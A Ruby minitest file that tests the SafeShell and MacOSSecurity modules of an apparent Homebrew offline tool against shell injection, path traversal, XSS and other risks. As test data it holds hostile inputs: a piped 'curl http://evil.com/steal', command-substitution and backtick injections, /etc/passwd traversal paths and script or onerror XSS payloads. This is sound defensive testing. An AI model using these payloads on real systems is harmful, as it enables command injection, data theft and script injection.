#!/usr/bin/env ruby
# frozen_string_literal: true

require 'minitest/autorun'
require 'fileutils'
require 'tmpdir'
require 'cgi'
require_relative '../lib/safe_shell'
require_relative '../lib/macos_security'

# SecurityTest: Comprehensive security testing for offlinebrew
#
# Tests for:
# - Shell injection protection
# - Path traversal protection
# - XSS protection in HTML generation
# - Timeout functionality
# - Filename sanitization
# - Code signature verification (macOS only)
class SecurityTest < Minitest::Test
  def setup
    @test_dir = Dir.mktmpdir('offlinebrew-security-test')
  end

  def teardown
    FileUtils.rm_rf(@test_dir) if @test_dir && Dir.exist?(@test_dir)
  end

  # ============================================================================
  # Shell Injection Tests
  # ============================================================================

  def test_shell_injection_protection_with_semicolon
    # Attempt to inject command with semicolon
    malicious_path = "#{@test_dir}; echo INJECTED > /tmp/hacked"

    # Create the directory (escaped)
    SafeShell.mkdir_p(malicious_path)

    # Execute command - should NOT execute the injection
    output = SafeShell.execute('ls', '-la', malicious_path, allowed_failures: true, timeout: 5)

    # Verify injection did NOT execute
    refute File.exist?('/tmp/hacked'), "Shell injection executed! Found /tmp/hacked"
    refute output.include?('INJECTED'), "Shell injection in output"
  end

  def test_shell_injection_protection_with_pipe
    # Attempt to inject command with pipe
    malicious_path = "#{@test_dir} | curl http://evil.com/steal"

    # Should be safely escaped
    SafeShell.mkdir_p(malicious_path)

    output = SafeShell.execute('echo', 'test', malicious_path, timeout: 5)

    # Should contain escaped pipe, not execute it
    assert output.include?('test'), "Command did not execute properly"
  end

  def test_shell_injection_protection_with_backticks
    # Attempt to inject command with backticks
    malicious_arg = "`whoami`"

    output = SafeShell.execute('echo', malicious_arg, timeout: 5)

    # Should NOT execute whoami, should echo literal backticks
    refute output.include?(ENV['USER'] || 'root'), "Backtick injection executed"
    assert output.include?('`'), "Backticks were not preserved"
  end

  def test_shell_injection_protection_with_command_substitution
    # Attempt to inject with $() syntax
    malicious_arg = "$(whoami)"

    output = SafeShell.execute('echo', malicious_arg, timeout: 5)

    # Should NOT execute command substitution
    refute output.strip == ENV['USER'], "Command substitution executed"
    assert output.include?('$('), "Command substitution syntax not preserved"
  end

  # ============================================================================
  # Path Traversal Tests
  # ============================================================================

  def test_path_traversal_protection_with_parent_directory
    # Attempt to escape base directory with ../
    assert_raises(SecurityError) do
      SafeShell.safe_join(@test_dir, '..', '..', 'etc', 'passwd')
    end
  end

  def test_path_traversal_protection_with_absolute_path
    # Attempt to use absolute path to escape
    assert_raises(SecurityError) do
      SafeShell.safe_join(@test_dir, '/etc/passwd')
    end
  end

  def test_path_traversal_protection_with_mixed_traversal
    # Attempt sneaky traversal: subdir/../../etc/passwd
    assert_raises(SecurityError) do
      SafeShell.safe_join(@test_dir, 'subdir', '..', '..', 'etc', 'passwd')
    end
  end

  def test_safe_join_allows_valid_subdirectories
    # Should work for legitimate subdirectories
    subdir = File.join(@test_dir, 'sub')
    FileUtils.mkdir_p(subdir)

    safe_path = SafeShell.safe_join(@test_dir, 'sub', 'file.txt')

    assert safe_path.start_with?(@test_dir), "Path should be within base directory"
    assert safe_path.end_with?('file.txt'), "Path should include filename"
  end

  def test_safe_join_with_single_file
    # Should work for files in base directory
    safe_path = SafeShell.safe_join(@test_dir, 'file.txt')

    assert safe_path.start_with?(@test_dir), "Path should be within base directory"
  end

  def test_safe_join_rejects_nonexistent_base
    # Should reject if base directory doesn't exist
    assert_raises(ArgumentError) do
      SafeShell.safe_join('/nonexistent/base/dir', 'file.txt')
    end
  end

  # ============================================================================
  # Filename Sanitization Tests
  # ============================================================================

  def test_safe_filename_accepts_normal_names
    assert SafeShell.safe_filename?('document.pdf')
    assert SafeShell.safe_filename?('my-file_v2.0.txt')
    assert SafeShell.safe_filename?('data.tar.gz')
  end

  def test_safe_filename_rejects_path_separators
    refute SafeShell.safe_filename?('../etc/passwd')
    refute SafeShell.safe_filename?('sub/dir/file.txt')
    refute SafeShell.safe_filename?('C:\\Windows\\System32\\evil.exe')
  end

  def test_safe_filename_rejects_null_bytes
    refute SafeShell.safe_filename?("file\0.txt")
  end

  def test_safe_filename_rejects_empty_string
    refute SafeShell.safe_filename?('')
    refute SafeShell.safe_filename?(nil)
  end

  def test_safe_filename_rejects_spaces_at_edges
    refute SafeShell.safe_filename?(' file.txt')
    refute SafeShell.safe_filename?('file.txt ')
    refute SafeShell.safe_filename?(' file.txt ')
  end

  def test_sanitize_filename_removes_path_separators
    assert_equal '___etc_passwd', SafeShell.sanitize_filename('../etc/passwd')
    assert_equal 'sub_dir_file.txt', SafeShell.sanitize_filename('sub/dir/file.txt')
  end

  def test_sanitize_filename_handles_empty_input
    assert_equal 'unnamed', SafeShell.sanitize_filename('')
    assert_equal 'unnamed', SafeShell.sanitize_filename(nil)
  end

  def test_sanitize_filename_limits_length
    long_name = 'a' * 300
    sanitized = SafeShell.sanitize_filename(long_name)

    assert sanitized.length <= 255, "Filename should be limited to 255 chars"
  end

  def test_sanitize_filename_removes_dangerous_characters
    # Test various dangerous characters
    # Note: sanitize_filename replaces each dangerous char with _, so multiple chars = multiple _
    assert_equal 'file__.txt', SafeShell.sanitize_filename('file<>.txt')
    assert_equal 'file_.txt', SafeShell.sanitize_filename('file|.txt')
    assert_equal 'file_.txt', SafeShell.sanitize_filename('file?.txt')
    assert_equal 'file_.txt', SafeShell.sanitize_filename('file*.txt')
  end

  # ============================================================================
  # Command Execution Tests
  # ============================================================================

  def test_execute_returns_output
    output = SafeShell.execute('echo', 'hello world', timeout: 5)

    assert output.include?('hello world'), "Should capture command output"
  end

  def test_execute_raises_on_failure
    assert_raises(SafeShell::ExecutionError) do
      SafeShell.execute('ls', '/nonexistent/path/12345', timeout: 5)
    end
  end

  def test_execute_allows_failures_when_requested
    output = SafeShell.execute('ls', '/nonexistent/path/12345',
                               timeout: 5, allowed_failures: true)

    # Should not raise, should return error output
    assert output.is_a?(String), "Should return string even on failure"
  end

  def test_execute_question_mark_returns_boolean
    # Should return true for successful command
    assert SafeShell.execute?('echo', 'test', timeout: 5)

    # Should return false for failed command
    refute SafeShell.execute?('ls', '/nonexistent/path/12345', timeout: 5)
  end

  def test_execute_with_retry_succeeds_eventually
    # Create a file that will exist after first attempt
    flag_file = File.join(@test_dir, 'flag')

    # Start a background task that creates the file after 1 second
    Thread.new do
      sleep 1
      FileUtils.touch(flag_file)
    end

    # This should eventually succeed with retries
    # Note: This test may be flaky depending on timing
    result = SafeShell.execute_with_retry('test', '-f', flag_file,
                                          timeout: 5, retries: 3)

    assert result.is_a?(String), "Should return output after retry"
  end

  # ============================================================================
  # Timeout Tests
  # ============================================================================

  def test_execute_timeout_is_enforced
    # Command that sleeps longer than timeout
    assert_raises(SafeShell::TimeoutError) do
      SafeShell.execute('sleep', '10', timeout: 1)
    end
  end

  def test_execute_timeout_message_includes_command
    error = assert_raises(SafeShell::TimeoutError) do
      SafeShell.execute('sleep', '10', timeout: 1)
    end

    assert error.message.include?('sleep'), "Error should mention the command"
    assert error.message.include?('1'), "Error should mention the timeout"
  end

  # ============================================================================
  # HTML XSS Protection Tests
  # ============================================================================

  def test_html_escaping_prevents_xss
    # Simulate malicious formula name
    malicious_name = "<script>alert('XSS')</script>"
    malicious_version = "1.0<img src=x onerror=alert('XSS')>"
    malicious_tap = "core\"><script>alert('XSS')</script>"

    # Escape using CGI (as required by SECURITY_ADDENDUM)
    safe_name = CGI.escapeHTML(malicious_name)
    safe_version = CGI.escapeHTML(malicious_version)
    safe_tap = CGI.escapeHTML(malicious_tap)

    # Build HTML fragment
    html = "<tr><td>#{safe_name}</td><td>#{safe_version}</td><td>#{safe_tap}</td></tr>"

    # Verify no unescaped script tags
    refute html.include?("<script>"), "Script tags should be escaped"
    # The literal string "onerror=" won't be in the output since '=' is not escaped by CGI.escapeHTML
    # Instead check that the dangerous tag structure is broken
    refute html.include?("<img"), "Image tags should be escaped"

    # Verify escaped versions are present
    assert html.include?("&lt;script&gt;"), "Script tags should be escaped as entities"
    assert html.include?("&lt;img"), "IMG tags should be escaped as entities"
  end

  def test_html_with_csp_header
    # Simulate HTML document with CSP
    html = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'unsafe-inline';">
        <title>Test</title>
      </head>
      <body>
        <h1>Test</h1>
      </body>
      </html>
    HTML

    # Verify CSP header is present
    assert html.include?("Content-Security-Policy"), "CSP header should be present"
    assert html.include?("script-src 'none'"), "Scripts should be blocked"
  end

  # ============================================================================
  # macOS Security Tests (skip if not on macOS)
  # ============================================================================

  def test_signature_verification_on_macos
    skip unless RUBY_PLATFORM.include?('darwin')

    # Test with a known system app
    system_app = '/System/Applications/Calculator.app'
    skip unless File.exist?(system_app)

    result = MacOSSecurity.verify_signature(system_app)

    assert result.is_a?(Hash), "Should return hash"
    assert result.key?(:valid), "Should have :valid key"
    assert result.key?(:message), "Should have :message key"

    # System apps should be validly signed
    assert result[:valid], "System app should have valid signature: #{result[:message]}"
  end

  def test_signature_verification_returns_false_for_missing_file
    result = MacOSSecurity.verify_signature('/nonexistent/app.app')

    refute result[:valid], "Should return invalid for missing file"

    # On macOS: "File not found: /path"
    # On non-macOS: "Not on macOS"
    if RUBY_PLATFORM.include?('darwin')
      assert result[:message].include?('File not found'), "Message should mention file not found"
    else
      assert result[:message].include?('Not on macOS'), "Message should mention platform"
    end
  end

  def test_signature_info_on_macos
    skip unless RUBY_PLATFORM.include?('darwin')

    system_app = '/System/Applications/Calculator.app'
    skip unless File.exist?(system_app)

    info = MacOSSecurity.signature_info(system_app)

    assert info.is_a?(Hash), "Should return hash"
    # System apps typically have authority info
    assert info[:authority] || info[:identifier], "Should have signature metadata"
  end

  def test_checksum_verification_matches
    # Create a test file
    test_file = File.join(@test_dir, 'test.txt')
    File.write(test_file, "hello world\n")

    # Calculate expected checksum
    if RUBY_PLATFORM.include?('darwin')
      expected = `shasum -a 256 #{test_file}`.split.first
    else
      expected = `sha256sum #{test_file}`.split.first
    end

    result = MacOSSecurity.verify_checksum(test_file, expected)

    assert result[:valid], "Checksum should match: #{result[:message]}"
  end

  def test_checksum_verification_fails_on_mismatch
    test_file = File.join(@test_dir, 'test.txt')
    File.write(test_file, "hello world\n")

    wrong_checksum = 'a' * 64  # Wrong checksum

    result = MacOSSecurity.verify_checksum(test_file, wrong_checksum)

    refute result[:valid], "Checksum should not match"
    assert result[:message].include?('mismatch'), "Message should indicate mismatch"
  end

  def test_quarantine_check_on_macos
    skip unless RUBY_PLATFORM.include?('darwin')

    test_file = File.join(@test_dir, 'test.txt')
    File.write(test_file, "test content\n")

    result = MacOSSecurity.check_quarantine(test_file)

    assert result.is_a?(Hash), "Should return hash"
    assert result.key?(:quarantined), "Should have :quarantined key"
  end

  # ============================================================================
  # Comprehensive Cask Security Check
  # ============================================================================

  def test_check_cask_security_structure
    skip unless RUBY_PLATFORM.include?('darwin')

    # Use a system app for testing
    system_app = '/System/Applications/Calculator.app'
    skip unless File.exist?(system_app)

    result = MacOSSecurity.check_cask_security(system_app)

    assert result.is_a?(Hash), "Should return hash"
    assert result.key?(:safe), "Should have :safe key"
    assert result.key?(:warnings), "Should have :warnings key"
    assert result.key?(:errors), "Should have :errors key"
    assert result.key?(:details), "Should have :details key"

    assert result[:warnings].is_a?(Array), "Warnings should be array"
    assert result[:errors].is_a?(Array), "Errors should be array"
  end

  # ============================================================================
  # File Operation Tests
  # ============================================================================

  def test_mkdir_p_creates_directory
    new_dir = File.join(@test_dir, 'new', 'nested', 'dir')

    result = SafeShell.mkdir_p(new_dir)

    assert result, "mkdir_p should return true"
    assert Dir.exist?(new_dir), "Directory should be created"
  end

  def test_mkdir_p_raises_on_empty_path
    assert_raises(ArgumentError) do
      SafeShell.mkdir_p('')
    end

    assert_raises(ArgumentError) do
      SafeShell.mkdir_p(nil)
    end
  end

  def test_rm_rf_removes_directory
    target_dir = File.join(@test_dir, 'to_remove')
    FileUtils.mkdir_p(target_dir)
    File.write(File.join(target_dir, 'file.txt'), 'content')

    result = SafeShell.rm_rf(target_dir)

    assert result, "rm_rf should return true"
    refute Dir.exist?(target_dir), "Directory should be removed"
  end

  def test_rm_rf_returns_false_for_nonexistent_path
    result = SafeShell.rm_rf('/nonexistent/path/12345')

    refute result, "rm_rf should return false for nonexistent path"
  end

  # ============================================================================
  # Security Audit Tests
  # ============================================================================

  def test_audit_for_unsafe_backticks_in_codebase
    # Scan for unsafe backtick usage in bin/ and lib/
    violations = []

    ['bin', 'lib'].each do |dir|
      dir_path = File.join(__dir__, '..', dir)
      next unless Dir.exist?(dir_path)

      Dir.glob("#{dir_path}/**/*.rb").each do |file|
        File.readlines(file).each_with_index do |line, index|
          # Skip comments
          next if line.strip.start_with?('#')

          # Skip if inside SafeShell module (it uses backticks internally)
          next if file.include?('safe_shell.rb')

          # Look for backticks with variables
          if line =~ /`.*#\{/ && !line.include?('SafeShell.execute')
            violations << "#{file}:#{index + 1}: #{line.strip}"
          end
        end
      end
    end

    # Report violations
    unless violations.empty?
      puts "\n⚠️  Found potentially unsafe backtick usage:"
      violations.each { |v| puts "  #{v}" }
    end

    # This is a warning, not a hard failure (for now)
    # When all code is updated, change this to assert
    puts "\nFound #{violations.size} potential unsafe backtick usages"
  end
end
